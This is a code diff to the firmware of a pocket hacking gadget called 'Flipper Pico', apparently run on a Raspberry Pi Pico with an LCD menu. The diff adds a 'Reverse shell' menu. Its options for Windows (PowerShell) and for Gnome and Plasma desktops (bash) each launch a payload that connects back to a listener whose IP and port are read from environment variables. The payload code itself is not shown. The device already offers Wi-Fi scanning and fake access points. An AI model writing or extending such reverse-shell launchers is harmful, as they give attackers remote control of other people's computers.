@@ -50,11 +50,38 @@ def lockScreenAwareness() -> None:
     menu.runMenu(menus, picoLCD, TEXT_FONT)
 
 
+def reverseShellWindows() -> None:
+    payloads.reverseShellPowerShell(getenv('LISTENER_IP'),
+                                    getenv('LISTENER_PORT'))
+
+
+def reverseShellGnome() -> None:
+    payloads.reverseShellBash(getenv('LISTENER_IP'),
+                              getenv('LISTENER_PORT'), False)
+
+
+def reverseShellPlasma() -> None:
+    payloads.reverseShellBash(getenv('LISTENER_IP'),
+                              getenv('LISTENER_PORT'), True)
+
+
+def reverseShell() -> None:
+    global TEXT_FONT
+    global picoLCD
+    MENU_WAIT_TIME = 0.5
+    sleep(MENU_WAIT_TIME)
+    menus = [('Windows', reverseShellWindows),
+             ('Gnome/Xfce/Cinnamon', reverseShellGnome),
+             ('Plasma', reverseShellPlasma)]
+    menu.runMenu(menus, picoLCD, TEXT_FONT)
+
+
 TEXT_FONT = FONT
 
 picoLCD = PicoLCD.LCD(color=0x001155)
 picoLCD.setTitle('Flipper Pico', 0xFFFFFF, TEXT_FONT)
 menus = [('Scan available networks', scanNetworksAction),
          ('Mock & monitor known Wifi AP', mockKnownAPAction),
-         ('Lock screen awarness', lockScreenAwareness)]
+         ('Lock screen awarness', lockScreenAwareness),
+         ('Reverse shell', reverseShell)]
 menu.runLoop(menus, picoLCD, TEXT_FONT)
